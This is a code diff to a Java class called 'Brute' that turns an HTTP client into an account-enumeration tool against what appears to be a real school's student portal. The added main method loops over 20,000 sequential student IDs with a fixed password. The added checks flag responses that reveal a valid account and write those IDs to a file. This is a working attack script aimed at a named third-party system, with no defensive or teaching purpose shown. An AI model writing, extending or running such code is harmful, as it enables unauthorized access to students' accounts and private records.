@@ -29,7 +29,6 @@ public class Brute
         con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
         con.setRequestProperty("X-Requested-With", "XMLHttpsRequest");
         con.setRequestProperty("Referer", "https://sisweb.resa.net/StudentPortal/");
-        con.setRequestProperty("Content-Length", "46");
         con.setRequestProperty("Pragma", "no-cache");
         con.setRequestProperty("Cache-Control", "no-cache");
 
@@ -63,8 +62,27 @@ public class Brute
             return true;
         } else {
             //not found
+            if (response.toString().indexOf("Password") != -1) {
+                System.out.println("valid---------------");
+                PrintWriter pw = new PrintWriter(new FileWriter(new File("ids.txt"), true));
+                pw.println(id);
+                pw.close();
+            } else {
+                System.out.println("invalid");
+            }
             return false;
         }
 
+    }
+    
+    public static void main() throws Exception {
+        /*for (int i = 0; i < 20000; i++) {
+            HttpConnection test = new HttpConnection();
+            test.sendPost();
+            HttpConnection.code++;
+        }*/
+        for (int i = 20000000; i < 20020000; i++) {
+            Brute.sendPost(i + "", "A");
+        }
     }
 }
